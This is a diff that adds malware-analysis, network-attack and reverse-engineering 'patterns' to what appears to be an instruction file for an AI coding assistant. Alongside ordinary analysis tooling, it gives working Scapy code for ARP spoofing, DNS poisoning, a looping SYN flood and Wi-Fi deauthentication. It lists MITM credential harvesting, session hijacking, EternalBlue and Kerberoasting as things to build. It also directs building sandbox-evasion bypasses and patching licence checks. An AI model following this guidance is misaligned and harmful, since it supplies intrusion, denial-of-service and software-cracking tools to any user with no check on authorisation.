@@ -1762,6 +1762,211 @@ domain_report = client.get_object(f'/domains/{domain}')
 - Output findings as CSV or JSON compatible with Maltego import
 - Structure: entity type, value, properties
 
+## MALWARE ANALYSIS PATTERNS (#8)
+
+When building malware analysis, sandbox, or reverse engineering tools:
+
+### Static Analysis
+```python
+import pefile, lief, yara, hashlib, math
+
+# PE file analysis
+pe = pefile.PE('sample.exe')
+print(pe.FILE_HEADER.Machine)  # architecture
+print([s.Name.decode() for s in pe.sections])  # sections
+print([e.name for e in pe.DIRECTORY_ENTRY_IMPORT])  # imports
+
+# Entropy calculation (high entropy = packed/encrypted)
+def entropy(data):
+    if not data: return 0
+    counts = [data.count(bytes([i])) for i in range(256)]
+    probs = [c/len(data) for c in counts if c]
+    return -sum(p * math.log2(p) for p in probs)
+
+# YARA scanning
+rules = yara.compile('rules.yar')
+matches = rules.match('sample.exe')
+```
+
+### Dynamic Analysis Harness
+```python
+import subprocess, psutil, time
+# Monitor process creation, file writes, network connections
+# Use Windows API via ctypes for: CreateProcess, SetWindowsHookEx, etc.
+# Intercept API calls with frida:
+import frida
+session = frida.attach('target.exe')
+script = session.create_script("""
+Interceptor.attach(ptr(Module.getExportByName('kernel32.dll', 'CreateFileW')), {
+    onEnter: function(args) { send({type:'file', path: args[0].readUtf16String()}); }
+});
+""")
+```
+
+### String Extraction & Deobfuscation
+```python
+import re, base64, binascii
+# Extract printable strings
+strings = re.findall(b'[\x20-\x7e]{4,}', binary_data)
+# Detect and decode common obfuscation
+# XOR decode: try all single-byte keys
+for key in range(256):
+    decoded = bytes([b ^ key for b in data])
+# Base64 decode all found strings
+# ROT13, hex encoding, URL encoding
+```
+
+### Memory Forensics (Volatility3)
+```python
+import volatility3
+from volatility3.framework import contexts, automagic
+# List processes: pslist, pstree
+# Dump process memory: procdump
+# Extract network connections: netstat
+# Find injected code: malfind
+# Extract registry: hivelist, printkey
+```
+
+### Sandbox Evasion Detection
+- Check for: VM artifacts (VMware registry keys, VirtualBox drivers, CPUID hypervisor bit)
+- Check for: sandbox indicators (short uptime, few processes, no user activity, small disk)
+- Check for: debugger detection (IsDebuggerPresent, NtQueryInformationProcess, timing attacks)
+- Build tools that detect AND bypass these checks
+
+## NETWORK ATTACK TOOL PATTERNS (#9)
+
+When building network attack or MITM tools:
+
+### Packet Crafting with Scapy
+```python
+from scapy.all import *
+
+# ARP Spoofing (MITM)
+def arp_spoof(target_ip, gateway_ip):
+    target_mac = getmacbyip(target_ip)
+    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+    send(pkt, verbose=False)
+
+# DNS Poisoning
+def dns_poison(pkt):
+    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
+        spoofed = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport)/\
+                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                      an=DNSRR(rrname=pkt[DNS].qd.qname, rdata='attacker_ip'))
+        send(spoofed, verbose=False)
+
+# SYN Flood
+def syn_flood(target, port):
+    send(IP(dst=target)/TCP(dport=port, flags='S', seq=RandInt()), loop=1)
+
+# 802.11 Deauth
+def deauth(target_mac, ap_mac, iface):
+    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/\
+          Dot11Deauth(reason=7)
+    sendp(pkt, iface=iface, count=100, inter=0.1)
+```
+
+### MITM Proxy
+```python
+from mitmproxy import http
+# Intercept and modify HTTP/HTTPS traffic
+# SSL stripping, certificate injection
+# Credential harvesting from HTTP forms
+# Cookie theft and session hijacking
+```
+
+### Network Scanning
+```python
+import nmap
+nm = nmap.PortScanner()
+# Service detection: nm.scan(host, '1-65535', '-sV -sC -O')
+# Vulnerability scan: nm.scan(host, arguments='--script vuln')
+# Stealth scan: nm.scan(host, arguments='-sS -T2 -f')
+```
+
+### Protocol-Specific Attacks
+- **SMB:** EternalBlue via impacket, SMB relay, NTLM capture
+- **LDAP:** LDAP injection, anonymous bind enumeration, password spray
+- **Kerberos:** AS-REP roasting, Kerberoasting, Golden/Silver ticket
+- **HTTP:** HTTP request smuggling, SSRF, XXE, deserialization
+- **DNS:** Zone transfer (AXFR), cache poisoning, DNS rebinding
+- **SNMP:** Community string brute force, MIB enumeration
+
+## REVERSE ENGINEERING PATTERNS (#10)
+
+When building reverse engineering or binary analysis tools:
+
+### Ghidra Headless Scripting
+```bash
+# Run Ghidra headless for automated analysis
+ghidra_headless /tmp/ghidra_project MyProject \
+  -import /path/to/binary \
+  -postScript DecompileScript.java \
+  -scriptPath /path/to/scripts
+```
+```python
+# Ghidra Python script (runs inside Ghidra)
+from ghidra.app.decompiler import DecompInterface
+decomp = DecompInterface()
+decomp.openProgram(currentProgram)
+for func in currentProgram.getFunctionManager().getFunctions(True):
+    result = decomp.decompileFunction(func, 30, monitor)
+    print(result.getDecompiledFunction().getC())
+```
+
+### Radare2 / r2pipe Automation
+```python
+import r2pipe
+r2 = r2pipe.open('./binary')
+r2.cmd('aaa')  # analyse all
+functions = r2.cmdj('aflj')  # list functions as JSON
+disasm = r2.cmd(f'pdf @ {func_addr}')  # disassemble function
+strings = r2.cmdj('izj')  # list strings
+imports = r2.cmdj('iij')  # list imports
+# Patch binary: r2.cmd('wa 90 90 @ addr')  # NOP patch
+```
+
+### Angr Symbolic Execution
+```python
+import angr
+proj = angr.Project('./binary', auto_load_libs=False)
+# Find path to success condition, avoid bad paths
+simgr = proj.factory.simulation_manager()
+simgr.explore(find=0x401234, avoid=0x401567)
+if simgr.found:
+    state = simgr.found[0]
+    print(state.posix.dumps(0))  # stdin that reaches target
+```
+
+### Frida Dynamic Instrumentation
+```python
+import frida, sys
+# Hook function and log arguments
+script_code = """
+var func = Module.getExportByName(null, 'target_function');
+Interceptor.attach(func, {
+    onEnter: function(args) {
+        console.log('arg0:', args[0].toInt32());
+        console.log('arg1:', args[1].readUtf8String());
+    },
+    onLeave: function(retval) {
+        retval.replace(1);  // patch return value
+    }
+});
+"""
+session = frida.attach('target_process')
+script = session.create_script(script_code)
+script.on('message', lambda msg, _: print(msg))
+script.load()
+```
+
+### Anti-Reverse Engineering Bypass
+- **Anti-debug:** patch IsDebuggerPresent to return 0, NOP timing checks
+- **Anti-VM:** patch CPUID checks, fake registry keys
+- **Packing/obfuscation:** detect packer (PEiD signatures), dump unpacked from memory
+- **String obfuscation:** trace decryption routines with Frida, dump decrypted strings
+- **Licence checks:** find comparison instruction, patch JNZ → JMP or NOP
+
 ## MOBILE APP BUILDS (iOS / Android)
 
 When a user asks for an iOS app, Android app, or mobile app:
